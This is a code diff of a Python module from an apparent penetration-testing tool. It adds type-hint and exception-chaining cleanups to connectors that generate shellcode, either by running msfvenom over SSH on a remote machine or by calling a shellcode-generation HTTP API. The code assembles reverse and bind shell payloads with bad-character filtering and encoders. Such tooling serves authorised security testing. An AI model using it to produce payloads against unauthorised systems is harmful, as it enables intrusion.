@@ -8,7 +8,6 @@ is not available locally.
 import json
 import logging
 import subprocess
-from typing import Optional
 from urllib.parse import urljoin
 
 import httpx
@@ -22,17 +21,17 @@ logger = logging.getLogger(settings.app_branding)
 
 class RemoteSSHConnector(ShellcodeConnector):
     """Generate shellcode on a remote machine via SSH.
-    
+
     Executes msfvenom (or other tools) on a remote machine via SSH.
     Requires SSH key-based authentication to be configured.
-    
+
     Attributes:
         host: Remote hostname or IP
         user: SSH username
         port: SSH port (default: 22)
         identity_file: Path to SSH private key (optional)
         remote_command: Command template for remote execution
-    
+
     Example:
         >>> connector = RemoteSSHConnector(
         ...     host='kali.example.com',
@@ -46,17 +45,17 @@ class RemoteSSHConnector(ShellcodeConnector):
         ...     port=4444
         ... )
     """
-    
+
     def __init__(
         self,
         host: str,
         user: str = "root",
         port: int = 22,
-        identity_file: Optional[str] = None,
+        identity_file: str | None = None,
         remote_command: str = "msfvenom",
     ):
         """Initialize SSH remote connector.
-        
+
         Args:
             host: Remote hostname or IP address
             user: SSH username (default: 'root')
@@ -73,10 +72,10 @@ class RemoteSSHConnector(ShellcodeConnector):
         self.port = port
         self.identity_file = identity_file
         self.remote_command = remote_command
-    
+
     def _check_availability(self) -> bool:
         """Check if SSH connection is available.
-        
+
         Returns:
             True if can connect to remote host, False otherwise
         """
@@ -91,24 +90,24 @@ class RemoteSSHConnector(ShellcodeConnector):
                 f"{self.user}@{self.host}",
                 "which", self.remote_command
             ])
-            
+
             result = subprocess.run(
                 cmd,
                 capture_output=True,
                 timeout=10,
             )
-            
+
             if result.returncode == 0:
                 logger.debug(f"SSH connection to {self.host} successful")
                 return True
             else:
                 logger.debug(f"Remote command '{self.remote_command}' not found on {self.host}")
                 return False
-                
+
         except Exception as e:
             logger.debug(f"SSH connection to {self.host} failed: {e}")
             return False
-    
+
     def generate(
         self,
         os_target: str,
@@ -116,13 +115,13 @@ class RemoteSSHConnector(ShellcodeConnector):
         shell_type: str,
         ip: str,
         port: int,
-        bad_chars: Optional[list[str]] = None,
-        encoder: Optional[str] = None,
+        bad_chars: list[str] | None = None,
+        encoder: str | None = None,
         iterations: int = 1,
-        custom_params: Optional[dict] = None,
+        custom_params: dict | None = None,
     ) -> bytes:
         """Generate shellcode via SSH on remote machine.
-        
+
         Args:
             os_target: Target OS
             arch: Target architecture
@@ -133,42 +132,42 @@ class RemoteSSHConnector(ShellcodeConnector):
             encoder: Encoder name
             iterations: Encoding iterations
             custom_params: Additional parameters
-        
+
         Returns:
             Raw shellcode bytes
-        
+
         Raises:
             RuntimeError: If SSH execution fails
         """
         if not self.is_available():
-            raise RuntimeError(f"SSH connection to {self.host} not available")
-        
+            raise RuntimeError(f"SSH connection to {self.host} not available") from None
+
         self.validate_parameters(os_target, arch, shell_type, ip, port)
-        
+
         # Build remote msfvenom command
         from .msfvenom import MsfvenomConnector
-        
+
         # Use msfvenom connector's payload mapping
         msfvenom_connector = MsfvenomConnector()
         payload = msfvenom_connector._get_payload_name(os_target, arch, shell_type)
-        
+
         remote_cmd = [self.remote_command, "-p", payload]
-        
+
         if shell_type.lower() in ["reverse", "bind"]:
             if shell_type.lower() == "reverse":
                 remote_cmd.extend([f"LHOST={ip}", f"LPORT={port}"])
             else:
                 remote_cmd.extend([f"RHOST={ip}", f"LPORT={port}"])
-        
+
         if bad_chars:
             bad_chars_str = "".join(bad_chars)
             remote_cmd.extend(["-b", bad_chars_str])
-        
+
         if encoder:
             remote_cmd.extend(["-e", encoder, "-i", str(iterations)])
-        
+
         remote_cmd.extend(["-f", "raw"])
-        
+
         # Build SSH command
         ssh_cmd = ["ssh"]
         if self.identity_file:
@@ -179,9 +178,9 @@ class RemoteSSHConnector(ShellcodeConnector):
             f"{self.user}@{self.host}",
             " ".join(remote_cmd)
         ])
-        
+
         logger.debug(f"Executing SSH command: {' '.join(ssh_cmd)}")
-        
+
         try:
             result = subprocess.run(
                 ssh_cmd,
@@ -189,34 +188,34 @@ class RemoteSSHConnector(ShellcodeConnector):
                 check=True,
                 timeout=60,
             )
-            
+
             shellcode = result.stdout
             if not shellcode:
-                raise RuntimeError("Remote command returned empty shellcode")
-            
+                raise RuntimeError("Remote command returned empty shellcode") from None
+
             logger.info(
                 f"Generated shellcode via SSH on {self.host}: {len(shellcode)} bytes"
             )
             return shellcode
-            
+
         except subprocess.CalledProcessError as e:
             error_msg = e.stderr.decode('utf-8', errors='ignore') if e.stderr else str(e)
-            raise RuntimeError(f"SSH execution failed: {error_msg}")
+            raise RuntimeError(f"SSH execution failed: {error_msg}") from e
         except subprocess.TimeoutExpired:
-            raise RuntimeError(f"SSH execution timed out after 60 seconds")
+            raise RuntimeError("SSH execution timed out after 60 seconds") from None
 
 
 class RemoteHTTPConnector(ShellcodeConnector):
     """Generate shellcode via HTTP API.
-    
+
     Connects to a remote HTTP API that generates shellcode. Useful for
     cloud services, internal tools, or custom shellcode generation servers.
-    
+
     Attributes:
         base_url: Base URL of the API
         api_key: Optional API key for authentication
         timeout: Request timeout in seconds
-    
+
     Example:
         >>> connector = RemoteHTTPConnector(
         ...     base_url='https://shellcode.example.com/api',
@@ -230,16 +229,16 @@ class RemoteHTTPConnector(ShellcodeConnector):
         ...     port=443
         ... )
     """
-    
+
     def __init__(
         self,
         base_url: str,
-        api_key: Optional[str] = None,
+        api_key: str | None = None,
         timeout: int = 30,
         endpoint: str = "/generate",
     ):
         """Initialize HTTP API connector.
-        
+
         Args:
             base_url: Base URL of the API (e.g., 'https://api.example.com')
             api_key: Optional API key for authentication
@@ -254,10 +253,10 @@ class RemoteHTTPConnector(ShellcodeConnector):
         self.api_key = api_key
         self.timeout = timeout
         self.endpoint = endpoint
-    
+
     def _check_availability(self) -> bool:
         """Check if HTTP API is available.
-        
+
         Returns:
             True if API is reachable, False otherwise
         """
@@ -266,20 +265,20 @@ class RemoteHTTPConnector(ShellcodeConnector):
             headers = {}
             if self.api_key:
                 headers["Authorization"] = f"Bearer {self.api_key}"
-            
+
             response = httpx.get(url, headers=headers, timeout=5)
-            
+
             if response.status_code in [200, 404]:  # 404 is OK if /health doesn't exist
                 logger.debug(f"HTTP API at {self.base_url} is reachable")
                 return True
             else:
                 logger.debug(f"HTTP API returned status {response.status_code}")
                 return False
-                
+
         except Exception as e:
             logger.debug(f"HTTP API connection failed: {e}")
             return False
-    
+
     def generate(
         self,
         os_target: str,
@@ -287,16 +286,16 @@ class RemoteHTTPConnector(ShellcodeConnector):
         shell_type: str,
         ip: str,
         port: int,
-        bad_chars: Optional[list[str]] = None,
-        encoder: Optional[str] = None,
+        bad_chars: list[str] | None = None,
+        encoder: str | None = None,
         iterations: int = 1,
-        custom_params: Optional[dict] = None,
+        custom_params: dict | None = None,
     ) -> bytes:
         """Generate shellcode via HTTP API.
-        
+
         Sends a POST request to the API endpoint with shellcode parameters
         and expects raw bytes in response.
-        
+
         Args:
             os_target: Target OS
             arch: Target architecture
@@ -307,13 +306,13 @@ class RemoteHTTPConnector(ShellcodeConnector):
             encoder: Encoder name
             iterations: Encoding iterations
             custom_params: Additional API-specific parameters
-        
+
         Returns:
             Raw shellcode bytes
-        
+
         Raises:
             RuntimeError: If API request fails
-        
+
         Example API request format:
             POST /generate
             {
@@ -327,18 +326,18 @@ class RemoteHTTPConnector(ShellcodeConnector):
             }
         """
         if not self.is_available():
-            raise RuntimeError(f"HTTP API at {self.base_url} not available")
-        
+            raise RuntimeError(f"HTTP API at {self.base_url} not available") from None
+
         self.validate_parameters(os_target, arch, shell_type, ip, port)
-        
+
         url = urljoin(self.base_url, self.endpoint)
         headers = {
             "Content-Type": "application/json",
         }
-        
+
         if self.api_key:
             headers["Authorization"] = f"Bearer {self.api_key}"
-        
+
         payload = {
             "os_target": os_target.lower(),
             "arch": arch.lower(),
@@ -346,19 +345,19 @@ class RemoteHTTPConnector(ShellcodeConnector):
             "ip": ip,
             "port": port,
         }
-        
+
         if bad_chars:
             payload["bad_chars"] = bad_chars
-        
+
         if encoder:
             payload["encoder"] = encoder
             payload["iterations"] = iterations
-        
+
         if custom_params:
             payload.update(custom_params)
-        
+
         logger.debug(f"Sending request to {url}: {json.dumps(payload, indent=2)}")
-        
+
         try:
             response = httpx.post(
                 url,
@@ -366,24 +365,24 @@ class RemoteHTTPConnector(ShellcodeConnector):
                 headers=headers,
                 timeout=self.timeout,
             )
-            
+
             response.raise_for_status()
-            
+
             # Expect raw bytes response
             shellcode = response.content
-            
+
             if not shellcode:
-                raise RuntimeError("API returned empty response")
-            
+                raise RuntimeError("API returned empty response") from None
+
             logger.info(
                 f"Generated shellcode via HTTP API: {len(shellcode)} bytes"
             )
             return shellcode
-            
+
         except httpx.HTTPStatusError as e:
             error_msg = e.response.text if e.response else str(e)
-            raise RuntimeError(f"HTTP API error ({e.response.status_code}): {error_msg}")
+            raise RuntimeError(f"HTTP API error ({e.response.status_code}): {error_msg}") from e
         except httpx.TimeoutException:
-            raise RuntimeError(f"HTTP API request timed out after {self.timeout} seconds")
+            raise RuntimeError(f"HTTP API request timed out after {self.timeout} seconds") from None
         except Exception as e:
-            raise RuntimeError(f"HTTP API request failed: {e}")
+            raise RuntimeError(f"HTTP API request failed: {e}") from e
